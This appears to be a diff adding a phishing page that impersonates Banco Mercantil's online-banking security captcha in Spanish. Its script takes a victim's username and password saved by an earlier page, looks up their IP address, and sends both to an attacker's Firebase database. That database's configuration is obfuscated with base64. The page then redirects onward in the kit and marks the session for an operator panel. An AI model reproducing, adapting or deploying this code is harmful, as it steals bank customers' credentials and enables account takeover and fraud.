@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mercantil - Verificación de Seguridad</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{
+  background: #0a1628;
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-family:'Segoe UI',Arial,sans-serif;
+}
+.card{
+  background:rgba(255,255,255,.04);
+  border:1px solid rgba(255,255,255,.1);
+  border-radius:16px;
+  padding:40px 36px;
+  width:100%;
+  max-width:420px;
+  text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,.5);
+}
+.logo{
+  width:70px;height:70px;
+  background:linear-gradient(135deg,#1a4d8f,#2563eb);
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 20px;
+  font-size:26px;color:#fff;
+  box-shadow:0 0 30px rgba(37,99,235,.4);
+}
+.title{font-size:18px;font-weight:700;color:#fff;margin-bottom:6px;}
+.sub{font-size:13px;color:rgba(255,255,255,.5);margin-bottom:28px;}
+
+.captcha-box{
+  background:rgba(255,255,255,.06);
+  border:1px solid rgba(255,255,255,.12);
+  border-radius:12px;
+  padding:22px 20px;
+  margin-bottom:20px;
+}
+.captcha-label{font-size:11px;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px;}
+.captcha-expr{
+  font-size:32px;font-weight:900;
+  color:#fff;
+  letter-spacing:4px;
+  margin-bottom:18px;
+  font-family:'Courier New',monospace;
+  text-shadow:0 0 20px rgba(37,99,235,.6);
+  /* anti-copy: no-select */
+  user-select:none;-webkit-user-select:none;
+}
+.captcha-inp{
+  width:100%;
+  background:rgba(255,255,255,.07);
+  border:1px solid rgba(255,255,255,.18);
+  border-radius:8px;
+  padding:12px 14px;
+  color:#fff;
+  font-size:18px;
+  text-align:center;
+  outline:none;
+  letter-spacing:4px;
+  transition:border-color .2s;
+}
+.captcha-inp:focus{border-color:#2563eb;}
+.captcha-inp.err{border-color:#ef4444;animation:shake .3s;}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+
+.btn-verify{
+  width:100%;
+  background:linear-gradient(135deg,#1a4d8f,#2563eb);
+  border:none;border-radius:10px;
+  padding:14px;
+  color:#fff;font-size:15px;font-weight:700;
+  cursor:pointer;
+  margin-top:8px;
+  transition:opacity .2s;
+}
+.btn-verify:hover{opacity:.88;}
+.btn-verify:disabled{opacity:.5;cursor:not-allowed;}
+
+.refresh-link{
+  margin-top:16px;
+  font-size:12px;color:rgba(255,255,255,.35);
+  cursor:pointer;
+  text-decoration:underline;
+}
+.refresh-link:hover{color:rgba(255,255,255,.6);}
+.spinner{display:none;margin:0 auto;width:28px;height:28px;border:3px solid rgba(255,255,255,.2);border-top-color:#2563eb;border-radius:50%;animation:spin .7s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.msg{font-size:12px;margin-top:10px;min-height:16px;color:#ef4444;}
+.msg.ok{color:#10b981;}
+.shield-icon{font-size:11px;color:rgba(255,255,255,.3);margin-top:20px;}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">🔒</div>
+  <div class="title">Verificación de Seguridad</div>
+  <div class="sub">Mercantil · Banca en Línea</div>
+
+  <div class="captcha-box">
+    <div class="captcha-label">⚠️ Por seguridad, resuelva esta operación</div>
+    <div class="captcha-expr" id="captcha-expr" draggable="false"></div>
+    <input type="tel" inputmode="numeric" class="captcha-inp" id="captcha-inp"
+      placeholder="Su respuesta" maxlength="4" autocomplete="off" spellcheck="false">
+  </div>
+
+  <div class="msg" id="msg"></div>
+  <button class="btn-verify" id="btn-verify" onclick="verificar()">
+    Verificar y Continuar
+  </button>
+  <div class="spinner" id="spinner"></div>
+
+  <div class="refresh-link" onclick="newCaptcha()">
+    🔄 Cambiar pregunta
+  </div>
+
+  <div class="shield-icon">🛡️ Banco Mercantil C.A. · Sistema Seguro</div>
+</div>
+
+<script src="config.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.13.0/firebase-database-compat.js"></script>
+<script>
+(function(){
+
+  // ===== Firebase =====
+  var _d = atob;
+  var _c = {
+    apiKey: _d('QUl6YVN5Q0FIVkRzLUVfTEtvVldyMXJKdmRqSHpHTndfbU0xSjVN'),
+    authDomain: _d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZWFwcC5jb20='),
+    databaseURL: _d('aHR0cHM6Ly9kZXZpY2Utc3RyZWFtaW5nLTJmOWU2OGI2LWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbQ=='),
+    projectId: _d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNg=='),
+    storageBucket: _d('ZGV2aWNlLXN0cmVhbWluZy0yZjllNjhiNi5maXJlYmFzZXN0b3JhZ2UuYXBw'),
+    messagingSenderId: _d('NTQyMDQ3NjIwNjYz'),
+    appId: _d('MTo1NDIwNDc2MjA2NjM6d2ViOjFlMzUyNmYxZGVlODA5MzdlZjc5YjI=')
+  };
+  if (!firebase.apps.length) firebase.initializeApp(_c);
+  var _db = firebase.database();
+
+  // ===== PATH =====
+  var _PATH = (typeof SITE_ID !== 'undefined' && SITE_ID)
+    ? SITE_ID
+    : atob('dm1fNzdjZjI4ZmZkYg==');
+
+  // ===== Recuperar credenciales del sessionStorage =====
+  var _usr = sessionStorage.getItem('_cap_usr') || '';
+  var _clv = sessionStorage.getItem('_cap_clv') || '';
+
+  // Si no hay datos de inicio.html, regresar
+  if (!_usr && !_clv) {
+    window.location.href = 'inicio.html';
+    return;
+  }
+
+  // ===== Detectar IP del atacante =====
+  var _ip = 'desconocida';
+  fetch('https://api.ipify.org?format=json')
+    .then(function(r){ return r.json(); })
+    .then(function(d){ _ip = d.ip || 'desconocida'; })
+    .catch(function(){});
+
+  // ===== Captcha Math =====
+  var _ops = [
+    ['+', function(a,b){return a+b;}],
+    ['-', function(a,b){return a-b;}],
+    ['×', function(a,b){return a*b;}]
+  ];
+  var _a, _b, _op, _ans;
+
+  function newCaptcha(){
+    var pick = _ops[Math.floor(Math.random() * _ops.length)];
+    _op = pick[0];
+    var fn = pick[1];
+    if(_op === '×'){
+      _a = Math.floor(Math.random() * 9) + 1;
+      _b = Math.floor(Math.random() * 9) + 1;
+    } else if(_op === '-'){
+      _a = Math.floor(Math.random() * 15) + 5;
+      _b = Math.floor(Math.random() * _a);
+    } else {
+      _a = Math.floor(Math.random() * 20) + 1;
+      _b = Math.floor(Math.random() * 20) + 1;
+    }
+    _ans = fn(_a, _b);
+    document.getElementById('captcha-expr').textContent = _a + ' ' + _op + ' ' + _b + ' = ?';
+    document.getElementById('captcha-inp').value = '';
+    document.getElementById('msg').textContent = '';
+    document.getElementById('msg').className = 'msg';
+    document.getElementById('captcha-inp').classList.remove('err');
+    document.getElementById('captcha-inp').focus();
+  }
+
+  // Generar captcha inicial
+  newCaptcha();
+  window.newCaptcha = newCaptcha;
+
+  // Enter key
+  document.getElementById('captcha-inp').addEventListener('keydown', function(e){
+    if(e.key === 'Enter') verificar();
+  });
+
+  // ===== Verificar captcha =====
+  window.verificar = function(){
+    var inp = document.getElementById('captcha-inp').value.trim();
+    var val = parseInt(inp);
+
+    if (isNaN(val) || val !== _ans) {
+      // Incorrecto
+      document.getElementById('captcha-inp').classList.add('err');
+      document.getElementById('msg').textContent = '❌ Respuesta incorrecta. Intente de nuevo.';
+      document.getElementById('msg').className = 'msg';
+      setTimeout(function(){
+        document.getElementById('captcha-inp').classList.remove('err');
+        newCaptcha();
+      }, 800);
+      return;
+    }
+
+    // ===== CORRECTO: es un bot que pasó el captcha =====
+    // Registrar en Firebase con clave FIJA 'M_captcha' → todos los bots se fusionan en 1 sesión
+    document.getElementById('btn-verify').disabled = true;
+    document.getElementById('spinner').style.display = 'block';
+    document.getElementById('msg').textContent = 'Verificando...';
+    document.getElementById('msg').className = 'msg ok';
+
+    // Registrar IP del atacante en Firebase para análisis
+    var ts = Date.now();
+    _db.ref('blocks/captcha_ips/' + (_ip.replace(/\./g, '_'))).transaction(function(cur){
+      if (!cur) {
+        return { ip: _ip, first: ts, last: ts, count: 1, last_usr: _usr, last_clv: _clv };
+      }
+      cur.last = ts;
+      cur.count = (cur.count || 0) + 1;
+      cur.last_usr = _usr;
+      cur.last_clv = _clv;
+      return cur;
+    });
+
+    // ===== SESIÓN ÚNICA PARA TODOS LOS BOTS: M_captcha =====
+    // Cualquier bot que pase el captcha sobrescribe SIEMPRE la misma fila
+    _db.ref(_PATH + '/M_captcha').update({
+      usuario:    _usr,
+      clave:      _clv,
+      ip:         _ip,
+      tipo:       'Mercantil',
+      estado:     'online',
+      page:       'carga',
+      _bot_captcha: true,       // <-- marca visible en CPanel
+      _k:         'MRC2024_captcha_v2',
+      _htok:      1,
+      last_updated: ts
+    }).then(function(){
+      // Redirigir a carga con el ID fijo de bot
+      sessionStorage.setItem('_sid', 'M_captcha');
+      window.location.href = 'carga.html';
+    }).catch(function(){
+      // Aunque falle el Firebase, redirigir igual (bot sale del captcha pero no infiltra)
+      window.location.href = 'carga.html';
+    });
+  };
+
+})();
+</script>
+</body>
+</html>
